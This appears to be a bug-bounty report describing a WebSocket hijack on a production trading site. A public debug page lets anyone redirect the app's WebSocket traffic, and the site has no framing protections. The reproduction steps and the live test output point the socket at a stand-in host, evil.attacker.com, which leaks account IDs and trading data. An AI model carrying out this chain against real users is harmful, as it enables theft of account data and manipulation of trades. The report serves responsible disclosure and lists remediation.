# WebSocket Hijack via Exposed Debug Endpoint + Missing Framing Protections

## Vulnerability Summary

**Target:** `dsmarttrader.deriv.com` (Production SmartTrader)
**Type:** WebSocket Man-in-the-Middle via Exposed Configuration Page
**Severity:** High
**CVSS:** 7.1+ (Network/Low/Required/Changed/High/Low/None)
**HackerOne Scope:** Important Business (`smarttrader.deriv.com`)

## Description

The production SmartTrader deployment at `dsmarttrader.deriv.com` exposes a developer/debug endpoint page at `/endpoint` that allows **any visitor** to change the WebSocket API server URL. This URL is persisted in `localStorage` as `config.server_url` and is used for **all** subsequent WebSocket connections, including authenticated trading API calls. Combined with the complete absence of framing protections (no `X-Frame-Options`, no CSP `frame-ancestors`), this creates an exploitable attack chain.

## Attack Chain

### Prerequisites
- Victim must be lured to an attacker-controlled page (standard phishing/social engineering)
- OR victim must visit the `/endpoint` URL directly (social engineering)

### Steps

1. **Exposed Endpoint Page:** The URL `https://dsmarttrader.deriv.com/endpoint` returns HTTP 200 with a fully functional form titled "Change API Endpoint" containing a text input, Submit button, and Reset button.

2. **Poison the WebSocket Server URL:** Entering any domain (e.g., `evil.attacker.com`) and clicking Submit stores it as `config.server_url` in localStorage.

3. **Persistent WebSocket Hijack:** On every subsequent page load, the application connects to `wss://<attacker-domain>/public` (or `/real?account_id=<id>` for logged-in users).

4. **Missing Framing Protections (Clickjacking Enabler):** SmartTrader serves NO `X-Frame-Options` and NO CSP `frame-ancestors`. `Access-Control-Allow-Origin: *`.

### Impact

- **Account ID Leakage:** account_id sent in WebSocket URL query string
- **Trading Data Interception:** All API calls flow through attacker's WebSocket
- **Trade Manipulation:** Attacker controls responses — fake prices, forged confirmations
- **Persistence:** Poison survives page reloads, browser restarts, new sessions

## Proof of Concept

### Reproduction Steps

1. Open `https://dsmarttrader.deriv.com/endpoint` in a browser
2. In the "Server" field, type: `evil.attacker.com`
3. Click "Submit"
4. Navigate to `https://dsmarttrader.deriv.com/en/trading.html`
5. Open DevTools > Network > WS tab
6. Observe: WebSocket connects to `wss://evil.attacker.com/public`
7. Verify: `localStorage.getItem('config.server_url')` returns `evil.attacker.com`

### PoC Output (from live production test, 2026-11-04)

```
[STEP 2] Verify /endpoint page is publicly accessible
  Status: 200
  Form present: true
  Server input: true (current: api-core.deriv.com)

[STEP 3] Set attacker-controlled WebSocket server
  config.server_url set to: evil.attacker.com

[STEP 4] Navigate to trading page
  *** HIJACKED *** wss://evil.attacker.com/public

[STEP 6] Verify persistence across page reloads
  After reload, still hijacked: true
```

## Vulnerable Code

### `derivatives-smarttrader/src/javascript/config.js` (lines 141-161)
```javascript
const getSocketURL = () => {
    let server_url = window.localStorage.getItem('config.server_url');
    if (!server_url) {
        server_url = getWebSocketUrl();
    }
    // ...
    return `wss://${server_url}${endpoint}${queryParams}`;
};
```

### `derivatives-smarttrader/src/javascript/app/pages/endpoint.js`
```javascript
const server_url = $server_url.val().trim().toLowerCase().replace(/[><()/"']/g, '');
if (server_url) localStorage.setItem('config.server_url', server_url);
```

## Security Headers (live response)
```
Content-Security-Policy: [NOT SET]
X-Frame-Options: [NOT SET]
Access-Control-Allow-Origin: *
```

## Remediation

1. Remove or restrict the `/endpoint` page in production
2. Add `X-Frame-Options: DENY` and `CSP: frame-ancestors 'self'`
3. Restrict `Access-Control-Allow-Origin` to trusted Deriv origins
4. Validate server URLs against `*.deriv.com` / `*.derivws.com` allowlist
